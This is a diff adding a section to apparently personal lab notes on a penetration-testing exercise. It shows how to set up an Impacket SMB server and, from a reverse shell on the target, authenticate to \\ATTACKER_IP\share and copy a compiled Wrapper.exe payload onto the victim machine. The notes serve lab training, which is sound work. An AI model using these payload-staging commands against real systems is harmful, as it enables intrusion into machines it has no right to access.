@@ -84,3 +84,46 @@ Write and compile a wrapper program using Mono or Visual Studio.
 
 Transfer the `Wrapper.exe`   file to the target. Just to spice things up a bit, let's use an Impacket SMB server, rather than our usual HTTP server. If you would prefer to use the HTTP server and cURL (or another method to transfer the file) you are welcome to do so.
 
+
+---
+
+## Impacket
+
+Impacket is a Python library that makes it very easy to interact with a wide variety of Windows services from Linux.  
+
+First up, let's download the package:  
+`sudo git clone https://github.com/SecureAuthCorp/impacket /opt/impacket && cd /opt/impacket && sudo pip3 install .   `
+
+> [!Note]
+>On the AttackBox Impacket is preinstalled at `/opt/impacket/impacket`
+
+We can now start up a temporary SMB server:  
+`sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword`
+
+![[99f9b77f1bf0.png]]
+
+With this command we created a server on our IP, serving a share called "share" in the current directory. As Impacket uses SMBv1 by default, we need to specify that is use SMBv2 in order for the relatively up-to-date target to accept it. We then set a username and password for connections to the server -- again, this is due to security policies on the target requiring connections to be authenticated.
+
+Now, in our #Reverse_Shell , we can use this command to authenticate: 
+
+`net use \\ATTACKER_IP\share /USER:user s3cureP@ssword`
+
+![[9a27791867af.png]]
+
+This authenticates with the server using the credentials we set (`user:s3cureP@ssword`). We can now copy our compiled  `Wrapper.exe` program up to the target. Due to file permissions on the normal `C:\Windows\Temp` directory, we are doing this from our current user's own `%TEMP%` directory:  
+
+`copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe`
+
+![[857c1d682e0e.png]]
+
+> [!Note]
+>We could have just executed this directly through the share -- exactly as we did with Mimikatz when dealing with the Gitserver. We are copying it here purely because we will need to have a copy on the target sooner or later anyway.
+
+It is often useful to just leave an SMB server running in the background when working with Windows targets. We will use this server later, so let's leave it up for now.
+
+That said, to prevent errors down the line, we should disconnect from it for the time being: 
+
+`net use \\ATTACKER_IP\share /del`
+
+![[060e1ee4ce7c.png]]
+
